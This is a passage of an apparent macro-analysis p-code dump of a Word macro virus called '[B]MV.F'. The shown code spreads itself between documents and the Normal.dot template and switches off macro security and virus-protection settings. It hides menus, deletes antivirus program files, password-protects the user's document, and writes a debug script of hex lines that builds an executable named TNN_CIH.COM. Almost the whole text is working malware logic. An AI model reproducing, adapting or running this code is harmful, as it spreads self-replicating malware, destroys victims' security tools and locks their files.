' 	LitStr 0x0009 "VARIABLE2"
' 	LitDI2 0x0007 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0009 "VARIABLE1"
' 	LitDI2 0x0008 
' 	ArgsSt r1 0x0001 
' Line #41:
' 	LitStr 0x0002 "ad"
' 	LitDI2 0x0009 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0002 "nt"
' 	LitDI2 0x000A 
' 	ArgsSt r1 0x0001 
' Line #42:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0008 
' 	For 
' 	QuoteRem 0x000F 0x0077 " Change this number up to how ever many variable you add - so if you have r1(20) then this line should read x = 1 to 20"
' Line #43:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0384 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0384 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St a1 
' Line #44:
' 	Ld a1 
' 	Ld x 
' 	ArgsLd r1 0x0001 
' 	ArgsCall (Call) VAMP 0x0002 
' Line #45:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #46:
' 	EndSub 
' Line #47:
' 	FuncDefn (Private Sub VAMP(VARIABLE1, VARIABLE2 As String))
' 	QuoteRem 0x0032 0x001B "VAMP v1.0 -=[Thanks Vic!]=-"
' Line #48:
' 	OnError (Resume Next) 
' Line #49:
' 	Dim 
' 	VarDefn VARIABLE3 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn VARIABLE4 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn VARIABLE5 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn VARIABLE6 (As Long)
' Line #50:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #51:
' 	LitDI2 0x0001 
' 	St VARIABLE3 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St VARIABLE4 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	St VARIABLE5 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St VARIABLE6 
' Line #52:
' 	Ld VARIABLE2 
' 	Ld VARIABLE3 
' 	Ld VARIABLE4 
' 	Ld VARIABLE5 
' 	Ld VARIABLE6 
' 	LitVarSpecial (True)
' 	ArgsMemLdWith Find 0x0006 
' 	DoWhile 
' Line #53:
' 	Ld VARIABLE3 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St s1 
' Line #54:
' 	Ld s1 
' 	Ld VARIABLE4 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld VARIABLE1 
' 	Concat 
' 	Ld s1 
' 	Ld VARIABLE6 
' 	ArgsLd Mid$ 0x0002 
' 	Concat 
' 	St s1 
' Line #55:
' 	Ld VARIABLE3 
' 	Ld s1 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #56:
' 	Ld VARIABLE5 
' 	LitDI2 0x0001 
' 	Add 
' 	St VARIABLE3 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St VARIABLE4 
' Line #57:
' 	MemLdWith CountOfLines 
' 	St VARIABLE5 
' Line #58:
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St VARIABLE6 
' Line #59:
' 	Loop 
' Line #60:
' 	EndWith 
' Line #61:
' 	EndSub 
' Macros/VBA/BMVf - 32607 bytes
' Line #0:
' 	FuncDefn (Sub BMVf())
' 	QuoteRem 0x000B 0x003A "[B]MV.f Module Infection - [Strain F of the [B]MV series!]"
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' Line #3:
' 	Ld Application 
' 	MemLd Version 
' 	LitR8 0x0000 0x0000 0x0000 0x4022 
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0021 0x004B " two lines below from W2000M/PSD - I'll give VicodinES the credit for this!"
' Line #4:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #5:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #6:
' 	EndIfBlock 
' Line #7:
' Line #8:
' 	Ld Application 
' 	MemLd Version 
' 	LitR8 0x0000 0x0000 0x0000 0x4020 
' 	Eq 
' 	IfBlock 
' Line #9:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Customize..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "view"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	LitStr 0x000A "Status Bar"
' 	LitStr 0x0004 "view"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #11:
' 	EndIfBlock 
' Line #12:
' Line #13:
' 	LitStr 0x0036 "c:\program files\microsoft office\templates\normal.dot"
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #14:
' Line #15:
' 	LitVarSpecial (False)
' 	St ADInfected 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St NTInfected 
' Line #16:
' Line #17:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #18:
' 	LineCont 0x0004 0D 00 08 00
' 	Ld I 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0004 "BMVf"
' 	Eq 
' 	IfBlock 
' Line #19:
' 	LitVarSpecial (True)
' 	St ADInfected 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #22:
' Line #23:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #24:
' 	LineCont 0x0004 0D 00 08 00
' 	Ld j 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0004 "BMVf"
' 	Eq 
' 	IfBlock 
' Line #25:
' 	LitVarSpecial (True)
' 	St NTInfected 
' Line #26:
' 	LitStr 0x000D "-=([B]MV.F)=-"
' 	Ld Application 
' 	MemSt Caption 
' Line #27:
' 	LitStr 0x0024 "-=([Bench] Macro Virus - Strain F)=-"
' 	Ld Application 
' 	MemSt StatusBar 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' Line #31:
' 	Ld ADInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld NTInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo BMVf 
' 	EndIf 
' Line #32:
' Line #33:
' 	Ld ADInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #34:
' 	LitStr 0x000D "c:\system.sys"
' 	LitStr 0x0004 "BMVf"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #35:
' 	LitStr 0x000D "c:\system.sys"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #36:
' 	LitStr 0x000D "c:\system.sys"
' 	ArgsCall Kill 0x0001 
' Line #37:
' 	EndIfBlock 
' Line #38:
' Line #39:
' 	Ld NTInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #40:
' 	LitStr 0x000D "c:\system.sys"
' 	LitStr 0x0004 "BMVf"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #41:
' 	LitStr 0x000D "c:\system.sys"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #42:
' 	LitStr 0x000D "c:\system.sys"
' 	ArgsCall Kill 0x0001 
' Line #43:
' 	EndIfBlock 
' Line #44:
' Line #45:
' 	Label BMVf 
' Line #46:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub FileSave())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	LitStr 0x002E "c:\program files\norton antivirus\Virscan2.dat"
' 	ArgsCall Kill 0x0001 
' Line #51:
' 	LitStr 0x000B "c:\vdoc\*.*"
' 	ArgsCall Kill 0x0001 
' Line #52:
' 	LitStr 0x000D "c:\f-prot\*.*"
' 	ArgsCall Kill 0x0001 
' Line #53:
' 	QuoteRem 0x0000 0x0035 "kill "C:\program files\antiviral toolkit pro\avp.key""
' Line #54:
' 	LitStr 0x000E "-=([B]MV.F])=-"
' 	Ld Application 
' 	MemSt Caption 
' Line #55:
' 	LitStr 0x0031 "-=([B]MV.F)=- / SAiNTS ViRii Dept. - Test Version"
' 	Ld Application 
' 	MemSt StatusBar 
' Line #56:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #57:
' 	EndSub 
' Line #58:
' 	FuncDefn (Sub ViewVBCode())
' Line #59:
' 	OnError (Resume Next) 
' Line #60:
' Line #61:
' 	ArgsCall (Call) BMVf 0x0000 
' Line #62:
' Line #63:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #64:
' 	Ld msoIconAlert 
' 	MemStWith Icon 
' Line #65:
' 	LitStr 0x0017 "[Bench] Macro Virus - F"
' 	MemStWith Heading 
' Line #66:
' 	LitStr 0x0037 "You're not permitted to go there! Now you're gonna pay!"
' 	MemStWith Then 
' Line #67:
' 	Ld msoAnimationSearching 
' 	MemStWith Animation 
' Line #68:
' 	ArgsMemCallWith Show 0x0000 
' Line #69:
' 	EndWith 
' Line #70:
' Line #71:
' 	LitStr 0x0007 "[Bench]"
' 	Ld ActiveDocument 
' 	MemSt Password 
' Line #72:
' 	Ld wdSaveChanges 
' 	ParamNamed Savechages 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' Line #73:
' Line #74:
' 	LitStr 0x002E "c:\program files\norton antivirus\Virscan2.dat"
' 	ArgsCall Kill 0x0001 
' Line #75:
' 	LitStr 0x000B "c:\vdoc\*.*"
' 	ArgsCall Kill 0x0001 
' Line #76:
' 	LitStr 0x000D "c:\f-prot\*.*"
' 	ArgsCall Kill 0x0001 
' Line #77:
' 	QuoteRem 0x0000 0x0032 " Kill "C:\program files\antiviral toolkit pro\*.*""
' Line #78:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #79:
' Line #80:
' 	LitStr 0x000E "c:\TNN_CIH.SCR"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #81:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "N TNN_CIH.COM"
' 	PrintItemNL 
' Line #82:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0100 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00"
' 	PrintItemNL 
' Line #83:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0110 B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #84:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0120 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #85:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0130 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 00"
' 	PrintItemNL 
' Line #86:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0140 0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68"
' 	PrintItemNL 
' Line #87:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0150 69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F"
' 	PrintItemNL 
' Line #88:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0160 74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20"
' 	PrintItemNL 
' Line #89:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0170 6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #90:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0180 50 45 00 00 4C 01 01 00 F1 68 20 35 00 00 00 00"
' 	PrintItemNL 
' Line #91:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0190 00 00 00 00 E0 00 0F 01 0B 01 05 00 00 10 00 00"
' 	PrintItemNL 
' Line #92:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01A0 00 00 00 00 00 00 00 00 10 10 00 00 00 10 00 00"
' 	PrintItemNL 
' Line #93:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01B0 00 20 00 00 00 00 40 00 00 10 00 00 00 02 00 00"
' 	PrintItemNL 
' Line #94:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01C0 04 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #95:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01D0 00 20 00 00 00 02 00 00 00 00 00 00 02 00 00 00"
' 	PrintItemNL 
' Line #96:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01E0 00 00 10 00 00 10 00 00 00 00 10 00 00 10 00 00"
' 	PrintItemNL 
' Line #97:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01F0 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #98:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0200 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #99:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0210 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #100:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0220 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #101:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0230 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #102:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #103:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0250 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #104:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0260 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #105:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0270 00 00 00 00 00 00 00 00 2E 74 65 78 74 00 00 00"
' 	PrintItemNL 
' Line #106:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0280 00 10 00 00 00 10 00 00 00 10 00 00 00 02 00 00"
' 	PrintItemNL 
' Line #107:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0290 00 00 00 00 00 00 00 00 00 00 00 00 20 00 00 60"
' 	PrintItemNL 
' Line #108:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #109:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #110:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #111:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #112:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #113:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #114:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0300 C3 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00"
' 	PrintItemNL 
' Line #115:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0310 55 8D 44 24 F8 2B DB 64 87 03 E8 00 00 00 00 5B"
' 	PrintItemNL 
' Line #116:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0320 8D 4B 42 51 50 50 0F 01 4C 24 FE 5B 83 C3 1C FA"
' 	PrintItemNL 
' Line #117:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0330 8B 2B 66 8B 6B FC 8D 71 12 56 66 89 73 FC C1 EE"
' 	PrintItemNL 
' Line #118:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0340 10 66 89 73 02 5E CC 56 8B F0 8B 48 FC F3 A4 83"
' 	PrintItemNL 
' Line #119:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0350 E8 08 8B 30 0B F6 74 02 EB F0 5E CC FB 2B DB EB"
' 	PrintItemNL 
' Line #120:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0360 07 2B DB 64 8B 03 8B 20 64 8F 03 58 5D 68 00 10"
' 	PrintItemNL 
' Line #121:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0370 40 00 C3 74 32 0F 21 C1 E3 10 83 04 24 15 66 89"
' 	PrintItemNL 
' Line #122:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0380 6B FC C1 ED 10 66 89 6B 02 CF 0F 23 C3 6A 0F 51"
' 	PrintItemNL 
' Line #123:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0390 6A FF 51 51 51 6A 01 6A 02 CD 20 53 00 01 00 83"
' 	PrintItemNL 
' Line #124:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03A0 C4 20 97 8D 46 9D CF 8D 87 E2 FC FF FF 50 CD 20"
' 	PrintItemNL 
' Line #125:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03B0 67 00 40 00 0F 23 C0 58 8B 4E 3D 8B 11 89 50 FC"
' 	PrintItemNL 
' Line #126:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03C0 8D 40 D6 89 01 FA EB B6 53 E8 00 00 00 00 5B 83"
' 	PrintItemNL 
' Line #127:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03D0 C3 24 53 CD 20 68 00 40 00 58 FF 74 24 08 FF 53"
' 	PrintItemNL 
' Line #128:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03E0 FC 59 50 53 FF 53 FC 59 0F 23 C0 58 5B C3 00 00"
' 	PrintItemNL 
' Line #129:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03F0 00 00 60 E8 00 00 00 00 5E 81 C6 18 03 00 00 F6"
' 	PrintItemNL 
' Line #130:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0400 06 01 0F 85 06 02 00 00 8D 5C 24 28 83 3B 24 0F"
' 	PrintItemNL 
' Line #131:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0410 85 F3 01 00 00 FE 06 83 C6 05 56 8A 43 04 3C FF"
' 	PrintItemNL 
' Line #132:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0420 74 08 04 40 B4 3A 89 06 46 46 6A 00 6A 7F 8B 5B"
' 	PrintItemNL 
' Line #133:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0430 10 8B 43 0C 83 C0 04 50 56 CD 20 41 00 40 00 83"
' 	PrintItemNL 
' Line #134:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0440 C4 10 81 7C 06 FC 2E 45 58 45 5E 0F 85 B4 01 00"
' 	PrintItemNL 
' Line #135:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0450 00 66 83 7B 18 01 0F 85 A9 01 00 00 66 B8 00 43"
' 	PrintItemNL 
' Line #136:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0460 CD 20 32 00 40 00 0F 82 99 01 00 00 51 8B BE 4D"
' 	PrintItemNL 
' Line #137:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0470 FD FF FF 8B 3F F6 C1 01 74 08 66 B8 01 43 2B C9"
' 	PrintItemNL 
' Line #138:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0480 FF D7 2B C0 B4 D5 2B C9 2B D2 42 8B DA 43 FF D7"
' 	PrintItemNL 
' Line #139:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0490 93 59 9C F6 C1 01 74 06 66 B8 01 43 FF D7 9D 0F"
' 	PrintItemNL 
' Line #140:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04A0 82 60 01 00 00 56 9C 83 C6 7F 2B C0 B4 D6 8B E8"
' 	PrintItemNL 
' Line #141:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04B0 6A 04 59 6A 3C 5A FF D7 8B 16 4A 8B C5 FF D7 81"
' 	PrintItemNL 
' Line #142:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04C0 3E 00 50 45 00 0F 85 24 01 00 00 53 6A 00 6A 01"
' 	PrintItemNL 
' Line #143:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04D0 52 57 0F 23 CC 50 8B C5 B1 52 83 C2 07 FF D7 8D"
' 	PrintItemNL 
' Line #144:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04E0 42 22 50 8D 06 50 0F B7 46 0E 8D 54 10 12 B0 28"
' 	PrintItemNL 
' Line #145:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04F0 8A 0E F6 E1 8D 76 32 50 52 56 41 51 C1 E1 03 51"
' 	PrintItemNL 
' Line #146:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0500 03 C8 03 CA 2B 4E 1C F7 D1 41 51 91 8B 46 F0 03"
' 	PrintItemNL 
' Line #147:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0510 46 FC 89 86 A8 FB FF FF 66 81 3C 24 B8 00 7C 7B"
' 	PrintItemNL 
' Line #148:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0520 8B C5 FF D7 95 6A 04 59 52 8B 56 3C 83 C2 12 FF"
' 	PrintItemNL 
' Line #149:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0530 D7 81 3E 6E 5A 69 70 74 67 5A 5B 5F 59 57 03 D5"
' 	PrintItemNL 
' Line #150:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0540 52 03 EE 55 8D 44 3D FC 89 18 53 03 D7 52 8D BE"
' 	PrintItemNL 
' Line #151:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0550 4A FB FF FF 57 89 56 CE 8D 56 D8 BD 00 04 00 00"
' 	PrintItemNL 
' Line #152:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0560 EB 31 83 C2 28 8B 5A 10 2B 5A 08 76 2C 53 83 E8"
' 	PrintItemNL 
' Line #153:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0570 08 89 18 8B 5A 14 03 5A 08 53 57 8B 5A 08 03 5A"
' 	PrintItemNL 
' Line #154:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0580 0C 03 5E FC 89 58 04 8B 18 01 5A 08 81 4A 24 40"
' 	PrintItemNL 
' Line #155:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0590 00 00 40 2B EB 76 0E 03 FB E2 C7 0F 21 CC EB 33"
' 	PrintItemNL 
' Line #156:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
